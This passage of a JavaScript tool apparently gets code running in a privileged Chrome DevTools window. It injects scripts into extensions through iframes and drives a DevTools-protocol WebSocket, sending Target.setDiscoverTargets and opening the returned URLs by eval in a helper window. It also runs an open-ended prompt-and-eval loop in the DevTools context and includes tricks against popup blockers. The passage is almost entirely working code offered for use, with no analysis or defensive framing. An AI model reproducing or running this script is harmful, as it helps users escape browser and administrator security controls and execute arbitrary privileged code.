                            cleanup: isCleanup // Pass the cleanup flag
                         }, '*'); // Consider targetOrigin `extensionOrigin` for better security
                     } else {
                        console.error(`Cannot post message to iframe ${iframeId}: contentWindow is null.`);
                        iframeManager.remove(iframeId); // Clean up broken iframe
                        updateIframeLog();
                    }
                 };
                 iframe.onerror = (err) => {
                     console.error(`Error loading iframe ${iframeId} for ${extensionOrigin}:`, err);
                     alert(`Failed to load iframe for extension ${extensionId}. Check ID and permissions.`);
                     iframeManager.remove(iframeId);
                     updateIframeLog();
                 };

             } catch (e) {
                 console.error("Error setting injected script or creating iframe:", e);
                 alert(`Error interacting with extension ${extensionId}: ${e.message}. See console.`);
             }
         } // end debugExtensionInteraction


        /** Updates the display log of active iframes */
        function updateIframeLog() {
             const logElement = document.getElementById('log');
             if (logElement) {
                logElement.textContent = `Active Iframes: ${Object.keys(iframeManager.iframes).length}\n`;
                 for (const id in iframeManager.iframes) {
                     logElement.textContent += ` - ID ${id}: ${iframeManager.iframes[id].src}\n`;
                 }
             }
        }


        /** Handles the 'Check for Updater' button click */
        function handleUpdaterCheck() {
            console.log("Checking for updates via WebSocket:", UPDATER_WEBSOCKET_PLACEHOLDER);
             if (UPDATER_WEBSOCKET_PLACEHOLDER.includes("%%")) {
                alert("Updater URL placeholder not replaced. Cannot check for updates.");
                return;
             }

             // Disable default unload behavior that might block reload
             // Note: Previous version had `while(true)`, which freezes. `null` is safe.
             const previousOnUnload = window.onunload;
             window.onunload = null;

            let ws;
            try {
                ws = new WebSocket(UPDATER_WEBSOCKET_PLACEHOLDER);
            } catch (e) {
                alert(`Failed to create WebSocket connection: ${e.message}`);
                console.error("WebSocket creation failed:", e);
                window.onunload = previousOnUnload; // Restore unload handler
                return;
            }


             ws.onopen = () => {
                 console.log("WebSocket opened. Sending discovery request.");
                 ws.send(JSON.stringify({
                     method: "Target.setDiscoverTargets",
                     id: Date.now(), // Use a somewhat unique ID
                     params: { discover: true } // Assuming params should be {discover: true}
                 }));
             };

             ws.onmessage = (event) => {
                 console.log("WebSocket message received:", event.data);
                 try {
                     const message = JSON.parse(event.data);
                     // Example logic: Look for a specific message type or URL
                     // The original logic seems specific, adapt as needed.
                     // This assumes a specific response format provides a URL to open.
                     if (message?.params?.request?.url) {
                         const targetUrl = message.params.request.url;
                         console.log("Found target URL from WebSocket:", targetUrl);
                         ws.close();

                         // Open URL via an intermediate blank window - often a trick to bypass popup blockers
                         // or establish opener relationships.
                         const intermediateWindow = window.open('', '_blank');
                         if (intermediateWindow) {
                             console.log("Opening intermediate window...");
                              // Use try-catch for eval. Ensure URL is safe if possible.
                             try {
                                intermediateWindow.eval(`
                                    console.log("Intermediate window executing opener...");
                                    setTimeout(() => {
                                        if (opener && typeof opener.open === 'function') {
                                             // Base64 encode/decode adds complexity but might be for escaping issues
                                             // Direct usage is simpler if targetUrl is safe and doesn't contain problematic chars
                                             // const urlToOpen = atob("${btoa(targetUrl)}"); // Original method
                                             const urlToOpen = "${targetUrl.replace(/"/g, '\\"')}"; // Simple escaped string
                                             console.log("Opener opening:", urlToOpen);
                                             opener.open(urlToOpen, '_blank');
                                         } else {
                                             console.error("Opener or opener.open is not available.");
                                         }
                                         console.log("Closing intermediate window.");
                                         window.close();
                                    }, 500); // Delay before opening actual URL
                                `);
                             } catch (e) {
                                console.error("Error eval-ing in intermediate window:", e);
                                try { intermediateWindow.close(); } catch (e2) {} // Close if eval failed
                             }

                             // Reload the current (DevTools) window after a delay
                             console.log("Scheduling reload of DevTools window...");
                             setTimeout(() => { location.reload(); }, 1000); // Reload after giving time for intermediate window

                         } else {
                             console.error("Failed to open intermediate window. Popup blocker?");
                             alert("Failed to open intermediate window. Check popup blocker.");
                             window.onunload = previousOnUnload; // Restore unload handler on failure
                         }
                     } else {
                         console.log("WebSocket message did not contain expected URL.");
                         // Keep listening or close? Depends on protocol. Assume close for now.
                         // ws.close();
                     }
                 } catch (e) {
                     console.error("Error processing WebSocket message:", e);
                     // Potentially close WS or handle error
                     // ws.close();
                 }
             };

             ws.onerror = (error) => {
                 console.error("WebSocket error:", error);
                 alert("WebSocket connection error. See console.");
                 window.onunload = previousOnUnload; // Restore unload handler
             };

             ws.onclose = (event) => {
                 console.log(`WebSocket closed. Code: ${event.code}, Reason: ${event.reason}`);
                 // Restore original unload handler if it wasn't already restored on success/error
                 window.onunload = previousOnUnload;
             };
        } // end handleUpdaterCheck

        /** Handles the 'Debug DevTools (Eval)' button */
        function handleDevtoolsDebugEval() {
            console.warn("Entering potentially dangerous DevTools eval loop. Type 'cancel' in prompt to stop.");
            let cancelled = false;
            let evalTimeoutId = null;

            // Define 'cancel' property getter on window to allow stopping loop
             Object.defineProperty(window, 'cancelEvalLoop', {
                 get: () => {
                     console.log("Eval loop cancellation requested.");
                     cancelled = true;
                     if (evalTimeoutId) clearTimeout(evalTimeoutId); // Clear any pending timeout
                     delete window.cancelEvalLoop; // Clean up the property
                     return "Loop cancelled.";
                 },
                 configurable: true // Allow deletion
             });

            function promptAndEval() {
                 if (cancelled) return;

                 try {
                    const code = prompt("Enter JavaScript to evaluate in DevTools context (or type 'cancel' to stop):");
                    if (code === null || code.toLowerCase() === 'cancel') {
                       console.log("Eval loop terminated by user prompt.");
                       if (!cancelled) window.cancelEvalLoop; // Trigger cleanup if not already cancelled
                       return;
                     }
                     if (code.trim() === '') {
                         console.log("Empty input, prompting again.");
                         evalTimeoutId = setTimeout(promptAndEval, 0); // Prompt again immediately
                         return;
                     }

                     console.log("Evaluating code:", code);
                     // Use Function constructor for slightly safer eval than direct eval()
                     const result = new Function(code)();
                     console.log("Eval result:", result);

                 } catch (e) {
                    console.error("Error during evaluation:", e);
                    alert(`Evaluation Error: ${e.message}`);
                 }

                 // Schedule the next prompt if not cancelled
                 if (!cancelled) {
                    evalTimeoutId = setTimeout(promptAndEval, 0); // Continue loop immediately
                 }
            }
            // Start the loop
            evalTimeoutId = setTimeout(promptAndEval, 0);
        } // end handleDevtoolsDebugEval

        // --- Initialize ---
        try {
            setupUI();
        } catch(e) {
            console.error("Fatal error setting up DevTools UI:", e);
            document.body.innerHTML = `<h1 style="color:red">Error</h1><p>Failed to initialize UI.</p><pre>${e.stack}</pre>`;
        }

    } // end devToolsUI function


    // --- Main Execution Flow ---

    async function main() {
        console.log("Script starting...");
        const openerWindow = getOpener();

        try {
            // Open DevTools and wait for API
            const devtoolsWindow = await openDevToolsAndGetAPI(openerWindow);

            // Store devtools window globally if absolutely needed by other scripts?
            // Avoid if possible.
             // window.w = devtoolsWindow; // Original code did this

            // Inject and execute the UI setup logic within the DevTools window context
            console.log("Executing UI setup in DevTools window context...");
            // We need to execute devToolsUI in the context of devtoolsWindow
            devtoolsWindow.eval(`(${devToolsUI.toString()})()`);

            console.log("UI setup initiated in DevTools window. Closing this helper window.");
            // Close the current window as its job is done
             window.close();

        } catch (error) {
            console.error("Critical error:", error);
            alert(`Failed to initialize DevTools interaction: ${error.message}. Check console for details.`);
            // Optionally, try to close any windows opened or restore state
        }
    }

    // Start the process
    main();

})();
